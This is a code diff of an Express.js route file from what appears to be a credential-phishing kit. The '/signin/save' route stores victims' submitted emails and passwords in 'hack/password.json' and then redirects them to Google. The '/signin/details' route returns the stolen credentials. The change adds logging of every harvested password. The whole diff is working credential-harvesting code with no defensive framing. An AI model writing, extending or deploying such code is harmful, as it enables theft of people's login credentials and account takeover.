@@ -23,6 +23,7 @@ router.post('/signin/save', function (req, res, next) {
   var pwdFile = JSON.parse(pwds);
   pwdFile.password.push({ email: req.body.hidEmail, password: req.body.Passwd });
   pwds = JSON.stringify(pwdFile);
+  console.log(pwds);
   fs.writeFileSync(__dirname + "/hack/password.json", pwds);
   res.redirect('https://www.google.co.in');
 });
@@ -88,7 +89,7 @@ router.get('/flatten', function (req, res, next) {
 });
 
 router.get('/signin/details', function (req, res, next) {
-  const pwdDetails = require('./hack/password.json');
+  const pwdDetails = fs.readFileSync(__dirname + "/hack/password.json");
   res.status(200).send(pwdDetails);
 });
 
